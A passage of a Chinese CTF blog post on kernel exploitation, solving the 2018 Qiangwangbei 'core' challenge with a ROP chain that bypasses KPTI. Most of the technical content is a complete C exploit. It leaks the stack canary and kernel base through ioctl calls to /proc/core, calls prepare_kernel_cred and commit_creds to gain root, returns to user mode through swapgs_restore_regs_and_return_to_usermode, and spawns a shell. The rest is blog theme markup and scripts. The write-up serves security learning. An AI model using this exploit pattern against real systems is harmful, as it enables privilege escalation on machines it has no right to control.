+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810012745930.png" alt="image-20250720184434389"></p>
+<p>然后我们就得到了这个函数的地址 </p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810012749226.png" alt="image-20250720185055421"></p>
+<p>计算偏移 ，这个偏移加上我们在调用exp得到的vmlinux地址就是我们最终的函数地址 </p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810012800865.png" alt="image-20250720185256511"></p>
+<p>这个是 <code>swapgs_restore_regs_and_return_usermode</code> 函数的汇编代码，可以看到前面有很多 pop ，但是我们实际要从 <code>mov rdi,rsp</code> 开始 ，而这个地方的偏移恰好是在 <code>swapgs_restore_regs_and_return_usermode + 22</code> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">↓   swapgs_restore_regs_and_return_to_usermode</span><br><span class="line">    0 // padding</span><br><span class="line">    0 // padding</span><br><span class="line">    user_shell_addr</span><br><span class="line">    user_cs</span><br><span class="line">    user_rflags</span><br><span class="line">    user_sp</span><br><span class="line">    user_ss</span><br></pre></td></tr></table></figure>
+
+<p>这个是我们要布置的栈布局 ，稍微改一下之前的代码就可以了</p>
+<h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;fcntl.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">#include&lt;sys/types.h&gt;</span><br><span class="line">#include&lt;sys/wait.h&gt;</span><br><span class="line">#include&lt;sys/ioctl.h&gt;</span><br><span class="line">#include&lt;pthread.h&gt;</span><br><span class="line">void setoff(int fd,long long size)&#123;</span><br><span class="line">    ioctl(fd,0x6677889c,size);</span><br><span class="line">&#125;</span><br><span class="line">void core_read(int fd,char *buf)&#123;</span><br><span class="line">    ioctl(fd,0x6677889b,buf);</span><br><span class="line">&#125;</span><br><span class="line">void core_copy_func(int fd,long long size)&#123;</span><br><span class="line">    ioctl(fd,0x6677889a,size);</span><br><span class="line">&#125;</span><br><span class="line">size_t user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line">void save_status(void)</span><br><span class="line">&#123;</span><br><span class="line">    asm volatile (</span><br><span class="line">        &quot;mov user_cs, cs;&quot;</span><br><span class="line">        &quot;mov user_ss, ss;&quot;</span><br><span class="line">        &quot;mov user_sp, rsp;&quot;</span><br><span class="line">        &quot;pushf;&quot;</span><br><span class="line">        &quot;pop user_rflags;&quot;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    puts(&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void get_shell()&#123;</span><br><span class="line">	system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int fd ;</span><br><span class="line">    size_t tmp;</span><br><span class="line">    char buf[0x50];</span><br><span class="line">    size_t rop[0x100];</span><br><span class="line">    size_t vmlinux_base,canary,core_base;</span><br><span class="line">    size_t commit_creds = 0x9c8e0;</span><br><span class="line">    size_t prepare_kernel_cred = 0x9cce0;</span><br><span class="line">    save_status();</span><br><span class="line">    fd = open(&quot;/proc/core&quot;,O_RDWR); //程序创造了一个接口，所以我们需要把这个接口给打开 ，这样才能进行函数调用</span><br><span class="line">    if(fd &lt; 0) &#123;</span><br><span class="line">        printf(&quot;Open /proc/core error!\n&quot;);</span><br><span class="line">        exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    setoff(fd,0x40); // v4 距离 canary 的偏移是 0x40 ，而且v5的数据类型是char类型。</span><br><span class="line">    core_read(fd,buf); //把canary读入用户态的buf </span><br><span class="line">    size_t pop_rdi = 0x000b2f;</span><br><span class="line">    size_t push_rax = 0x02d112;</span><br><span class="line">    size_t swapgs = 0x0d6;</span><br><span class="line">    size_t iretq ;</span><br><span class="line">    size_t xchg = 0x16684f0;</span><br><span class="line">    size_t call_rax = 0x40398;</span><br><span class="line">    size_t pop_rcx = 0x21e53;</span><br><span class="line">    size_t pop_rbp = 0x3c4;</span><br><span class="line">    size_t pop_rdx = 0xa0f49;</span><br><span class="line">    size_t mov_rdi_rax_call_rdx = 0x01aa6a;</span><br><span class="line">    //此时buf的前八个字节是我们的canary</span><br><span class="line">    canary = (*(size_t *)(&amp;buf[0]));</span><br><span class="line">    puts(&quot;\033[34m\033[1m[*] leak success! .\033[0m&quot;);</span><br><span class="line">    printf(&quot;\033[34m\033[1m[*] Canary  &gt;&gt; %p.\033[0m\n&quot;,canary);</span><br><span class="line">    core_base = (*(size_t *)(&amp;buf[2*8])) - 0x19b;</span><br><span class="line">    puts(&quot;\033[34m\033[1m[*] leak success! .\033[0m&quot;);</span><br><span class="line">    printf(&quot;\033[34m\033[1m[*] core_base  &gt;&gt; %p.\033[0m\n&quot;,core_base);</span><br><span class="line">    vmlinux_base = (*(size_t *)(&amp;buf[4*8]) - 0x1dd6d1);</span><br><span class="line">    puts(&quot;\033[34m\033[1m[*] leak success! .\033[0m&quot;);</span><br><span class="line">    printf(&quot;\033[34m\033[1m[*] vmlinux_base  &gt;&gt; %p.\033[0m\n&quot;,vmlinux_base);</span><br><span class="line">    pop_rdi += vmlinux_base;</span><br><span class="line">    pop_rcx += vmlinux_base;</span><br><span class="line">    pop_rbp += vmlinux_base;</span><br><span class="line">    pop_rdx += vmlinux_base;</span><br><span class="line">    mov_rdi_rax_call_rdx += vmlinux_base;</span><br><span class="line">    swapgs += core_base;</span><br><span class="line">    iretq = 0x50ac2 + vmlinux_base;</span><br><span class="line">    commit_creds += vmlinux_base;</span><br><span class="line">    prepare_kernel_cred += vmlinux_base;</span><br><span class="line">    size_t swapgs_restore_regs_and_return_to_usermode = 0xa008da + vmlinux_base;</span><br><span class="line">    int i = 0;</span><br><span class="line">    for(i=0;i&lt;10;i++)&#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    i = 10;</span><br><span class="line">    rop[i++] = pop_rdi; </span><br><span class="line">    rop[i++] = 0;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;</span><br><span class="line">    rop[i++] = pop_rdx;</span><br><span class="line">    rop[i++] = pop_rcx;</span><br><span class="line">    rop[i++] = mov_rdi_rax_call_rdx;</span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line">    rop[i++] = swapgs_restore_regs_and_return_to_usermode+22; </span><br><span class="line">    rop[i++] = 0;</span><br><span class="line">    rop[i++] = 0;</span><br><span class="line">    rop[i++] = (size_t)get_shell;</span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line">    write(fd,rop,i*8);</span><br><span class="line">    core_copy_func(fd,0xf000000000000000+i*8);</span><br><span class="line">    puts(&quot;\033[34m\033[1m[*] Attack Success! .\033[0m&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250810012752743.png" alt="image-20250720185702429"></p>
+<p>成功提权</p>
+<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/kpti-bypass/">https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/kpti-bypass/</a></p>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src="/img/author.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src="/img/author.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">SpaceDraG0n</div><div class="post-copyright__author_desc">认真做事 坚持学习</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://spacedrag0n-1.github.io/posts/16110.html">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://spacedrag0n-1.github.io/posts/16110.html')">Kernel初识 - Kernel ROP with KPTI bypass</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://spacedrag0n-1.github.io/posts/16110.html"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=Kernel初识 - Kernel ROP with KPTI bypass&amp;url=http://spacedrag0n-1.github.io/posts/16110.html&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
+  var currentPageUrl = window.location.href;
+  var input = document.createElement("input");
+  input.setAttribute("value", currentPageUrl);
+  document.body.appendChild(input);
+  input.select();
+  input.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  document.body.removeChild(input);
+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://SpaceDraG0n-1.github.io" target="_blank">SpaceDraG0n</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__category-list"><a class="post-meta__box__categoryes" href="/categories/%E7%9F%A5%E8%AF%86%E5%88%86%E4%BA%AB/"><span class="categoryes-punctuation"> <i class="anzhiyufont anzhiyu-icon-inbox"></i></span>知识分享<span class="categoryesPageCount">3</span></a></div><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/Kernel-Pwn/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>Kernel Pwn<span class="tagsPageCount">2</span></a></div></div><div class="post_share"><div class="social-share" data-image="/img/author.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/posts/16109.html"><img class="prev-cover" src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">House of Corrosion</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/posts/16108.html" title="Kernel初识 - Kernel ROP"><img class="cover" src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-08-07</div><div class="title">Kernel初识 - Kernel ROP</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src="/img/author.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description">欢迎来到宇宙空间站, 希望你在这里找到所需的知识和教程, 开启一段充满奥秘的奇妙之旅!</div></div></div><div class="card-widget" id="card-poem"><div id="poem_sentence"></div><div id="poem_info"><div id="poem_dynasty"></div><div id="poem_author"></div></div></div><script src="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/poem/jinrishici.js" charset="utf-8"></script><script type="text/javascript">jinrishici.load(function(result) {
+var sentence = document.querySelector("#poem_sentence")
+var author = document.querySelector("#poem_author")
+var dynasty = document.querySelector("#poem_dynasty")
+
+var sentenceText = result.data.content
+sentenceText = sentenceText.substr(0, sentenceText.length - 1);
+sentence.innerHTML = sentenceText
+dynasty.innerHTML = result.data.origin.dynasty
+author.innerHTML = result.data.origin.author + '《' + result.data.origin.title + '》'
+});</script><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的小站！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Kernel-ROP-with-KPTI-bypass"><span class="toc-text">Kernel ROP with KPTI bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E5%90%AFKPTI%E4%BF%9D%E6%8A%A4"><span class="toc-text">开启KPTI保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-%EF%BC%9A%E5%BC%BA%E7%BD%91%E6%9D%AF-2018-core"><span class="toc-text">例题 ：强网杯 2018 - core</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP%EF%BC%9A"><span class="toc-text">EXP：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5%EF%BC%9A"><span class="toc-text">参考链接：</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/16110.html" title="Kernel初识 - Kernel ROP with KPTI bypass">Kernel初识 - Kernel ROP with KPTI bypass</a><time datetime="2025-08-09T17:26:50.815Z" title="发表于 2025-08-10 01:26:50">2025-08-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/16109.html" title="House of Corrosion">House of Corrosion</a><time datetime="2025-08-08T08:38:21.348Z" title="发表于 2025-08-08 16:38:21">2025-08-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/16108.html" title="Kernel初识 - Kernel ROP">Kernel初识 - Kernel ROP</a><time datetime="2025-08-07T09:53:26.981Z" title="发表于 2025-08-07 17:53:26">2025-08-07</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2025 By <a class="footer-bar-link" href="/" title="SpaceDraG0n" target="_blank">SpaceDraG0n</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">1</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/House-of-%E7%B3%BB%E5%88%97%E6%89%8B%E6%B3%95/" style="font-size: 0.88rem;">House of 系列手法<sup>1</sup></a><a href="/tags/Kernel-Pwn/" style="font-size: 0.88rem;">Kernel Pwn<sup>2</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="switch-commentBarrage" href="javascript:anzhiyu.switchCommentBarrage();" title="开关弹幕"><i class="anzhiyufont anzhiyu-icon-danmu"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("08/05/2025 12:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2025 By 安知鱼 V1.6.14",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
